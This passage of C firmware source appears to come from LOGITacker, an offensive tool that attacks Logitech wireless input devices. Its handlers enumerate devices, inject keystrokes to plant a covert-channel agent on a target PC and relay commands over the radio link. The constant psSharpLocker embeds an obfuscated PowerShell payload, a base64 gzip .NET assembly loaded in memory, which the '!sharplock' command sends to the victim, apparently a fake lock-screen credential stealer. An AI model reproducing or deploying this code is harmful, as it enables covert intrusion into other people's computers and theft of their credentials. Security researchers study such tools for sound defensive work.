    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum USB mouse pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_mouse ? "on" : "off");
}

static void cmd_options_discover_pass_raw(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.discover_pass_through_hidraw = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.discover_pass_through_hidraw = true;

    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "discover raw USB pass-through: %s\r\n", g_logitacker_global_config.discover_pass_through_hidraw ? "on" : "off");
}

static void cmd_options_passiveenum_pass_raw(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_hidraw = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_hidraw = true;

    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum raw USB pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_hidraw ? "on" : "off");
}

static void cmd_enum_passive(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting passive enumeration for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_passive_enum(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}

#ifdef CLI_TEST_COMMANDS
static void cmd_prx(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting PRX with address %s\r\n", tmp_addr_str);
        logitacker_enter_mode_prx(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}
#endif

static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting active enumeration for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_active_enum(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}


#define MAX_CC_PAY_SIZE 16
const char psSharpLocker[] = "powershell\n$b=\"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\";nal no New-Object -F;$m=no IO.MemoryStream;(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress)).CopyTo($m);[System.Reflection.Assembly]::Load($m.ToArray()) | Out-Null;[Windows.System.UserProfile.LockScreen,Windows.System.UserProfile,ContentType=WindowsRuntime] | Out-Null;[SharpLockerLib.Runner]::Run([Windows.System.UserProfile.LockScreen]::OriginalImageFile.AbsolutePath);exit";

bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const p_cmd_buf) {
    if (strcmp(p_cmd_buf, "!exit") == 0) {
        nrf_cli_register_pre_cmd_callback(p_cli, NULL);
        logitacker_enter_mode_discovery();
        return true;
    }

    if (strcmp(p_cmd_buf, "!sharplock") == 0) {
        return pre_cmd_callback_covert_channel(p_cli, psSharpLocker);
    }

    covert_channel_payload_data_t tmp_tx_data = {0};

    //push chunks of cmd_buff
    int pos = 0;
    while (strlen(&p_cmd_buf[pos]) >= MAX_CC_PAY_SIZE) {
        memcpy(tmp_tx_data.data, &p_cmd_buf[pos], MAX_CC_PAY_SIZE);
        tmp_tx_data.len = MAX_CC_PAY_SIZE;

        NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data, MAX_CC_PAY_SIZE);
        uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
        if (err != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
            return true;
        }

        pos += MAX_CC_PAY_SIZE;
    }


    size_t slen = strlen(&p_cmd_buf[pos]);

    memset(tmp_tx_data.data, 0, 16);
    memcpy(tmp_tx_data.data, &p_cmd_buf[pos], slen);
    tmp_tx_data.len = slen + 1;

    //append line break
    tmp_tx_data.data[slen] = '\n';

    NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data,tmp_tx_data.len);

    uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
    if (err != NRF_SUCCESS) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
    }

    return true;
}


static void cmd_covert_channel_connect(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting covert channel for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_covert_channel(addr, p_cli);

        nrf_cli_register_pre_cmd_callback(p_cli, &pre_cmd_callback_covert_channel);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "enter '!exit' to return to normal CLI mode\r\n\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "This feature is a PoC in experimental state\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "I don't accept issues or requests on it, unless they fly in \r\nas working PR for LOGITacker\r\n");

        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}

static void cmd_covert_channel_deploy(nrf_cli_t const *p_cli, size_t argc, char **argv) {

    if (argc > 1)
    {
        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (strcmp(argv[1], "USB") == 0) {
            memset(addr,0x00,5);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
        } else {
            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
                return;
            }

            char tmp_addr_str[16];
            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
        }

        bool hide = true;
        if (argc > 2 && strcmp(argv[2],"unhide") == 0) hide = false;

        // deploy covert channel agent
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load covert channel client agent script\r\n");
        deploy_covert_channel_script(hide);
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject covert channel client agent into target %s\r\n", argv[1]);

        //logitacker_keyboard_map_test();
        logitacker_enter_mode_injection(addr);
        logitacker_injection_start_execution(true);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
        return;
    }
}


#ifdef CLI_TEST_COMMANDS
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_test)
        {
                NRF_CLI_CMD(a, NULL, "test a", cmd_test_a),
                NRF_CLI_CMD(b, NULL, "test b", cmd_test_b),
                NRF_CLI_CMD(c, NULL, "test b", cmd_test_c),
                NRF_CLI_SUBCMD_SET_END
        };
NRF_CLI_CMD_REGISTER(test, &m_sub_test, "Debug command to test code", NULL);

NRF_CLI_CMD_REGISTER(testled, NULL, "Debug command to test code", cmd_testled);
#endif



